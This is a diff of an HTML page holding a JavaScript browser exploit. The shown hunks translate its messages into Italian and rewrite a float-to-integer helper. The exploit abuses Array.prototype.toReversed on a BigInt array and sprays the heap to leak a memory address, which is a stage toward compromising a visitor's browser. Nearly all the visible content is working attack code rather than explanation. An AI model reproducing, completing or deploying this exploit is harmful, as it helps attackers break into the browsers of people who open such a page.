@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -18,11 +18,17 @@
         }
 
         function f2i(val) {
-            return new DataView(new Float64Array([val]).buffer).getBigUint64(0, true);
+            let buffer = new ArrayBuffer(8);
+            let floatView = new Float64Array(buffer);
+            let intView = new BigUint64Array(buffer);
+            floatView[0] = val;
+            return intView[0];
         }
 
         async function exploit() {
-            const v1 = [-1n]; 
+            alert("Inizio exploit...");
+
+            const v1 = [-1n];
             let v2;
 
             if (Array.prototype.toReversed) {
@@ -34,7 +40,7 @@
             }
 
             alert("Descrizione di v2: " + JSON.stringify(v2));
-            await sleepSeconds(5);
+            await sleepSeconds(2);
             alert("Accesso a v2[2]: " + (v2[2]?.toString() || "undefined"));
 
             let spray_arr = new Array(0x20);
@@ -55,6 +61,8 @@
 
             let addr1 = f2i(b1[1]);
             alert("leak1: " + hex(addr1));
+
+            alert("Exploit completato!");
         }
     </script>
 </head>
